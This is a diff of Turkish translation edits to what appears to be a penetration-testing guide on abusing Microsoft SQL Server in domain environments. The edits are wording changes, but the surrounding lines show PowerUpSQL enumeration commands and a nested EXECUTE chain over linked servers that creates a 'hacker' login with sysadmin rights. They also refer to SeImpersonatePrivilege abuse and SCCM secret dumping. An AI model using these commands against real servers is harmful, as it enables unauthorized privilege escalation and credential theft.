@@ -90,7 +90,7 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ---
 ###  Powershell
 
-Bu durumda powershell modülü [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) çok faydalıdır.
+Bu durumda [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) powershell modülü çok faydalıdır.
 ```bash
 Import-Module .\PowerupSQL.psd1
 ````
@@ -133,7 +133,7 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL Temel Suistimal
+## MSSQL Temel İstismar
 
 ### Erişim Veritabanı
 ```bash
@@ -269,7 +269,7 @@ Eğer `openquery()` üzerinden `exec xp_cmdshell` gibi işlemleri gerçekleştir
 
 ### Manuel - EXECUTE
 
-Ayrıca, `EXECUTE` kullanarak güvenilir bağlantıları da istismar edebilirsiniz:
+Ayrıca `EXECUTE` kullanarak güvenilir bağlantıları da istismar edebilirsiniz:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -279,14 +279,14 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 **MSSQL yerel kullanıcısı** genellikle **`SeImpersonatePrivilege`** adı verilen özel bir yetkiye sahiptir. Bu, hesabın "kimlik doğrulamasından sonra bir istemciyi taklit etmesine" olanak tanır.
 
-Birçok yazarın geliştirdiği bir strateji, bir SİSTEM hizmetini, saldırganın oluşturduğu sahte veya adam ortada hizmete kimlik doğrulaması yapmaya zorlamaktır. Bu sahte hizmet, kimlik doğrulaması yapmaya çalışırken SİSTEM hizmetini taklit edebilir.
+Birçok yazarın geliştirdiği bir strateji, bir SİSTEM hizmetini, saldırganın oluşturduğu sahte veya ortadaki adam hizmetine kimlik doğrulaması yapmaya zorlamaktır. Bu sahte hizmet, kimlik doğrulaması yapmaya çalışırken SİSTEM hizmetini taklit edebilir.
 
 [SweetPotato](https://github.com/CCob/SweetPotato), Beacon'ın `execute-assembly` komutu aracılığıyla yürütülebilecek bu çeşitli tekniklerin bir koleksiyonuna sahiptir.
 
 
 
 ### SCCM Yönetim Noktası NTLM İletimi (OSD Gizli Çıkarma)
-SCCM **Yönetim Noktaları**nın varsayılan SQL rollerinin, Ağ Erişim Hesabı ve Görev Dizisi gizli bilgilerini doğrudan site veritabanından dökme amacıyla nasıl kötüye kullanılabileceğini görün:
+SCCM **Yönetim Noktaları**nın varsayılan SQL rollerinin, Ağ Erişim Hesabı ve Görev Dizisi gizli bilgilerini doğrudan site veritabanından dökme amacıyla nasıl istismar edilebileceğini görün:
 
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
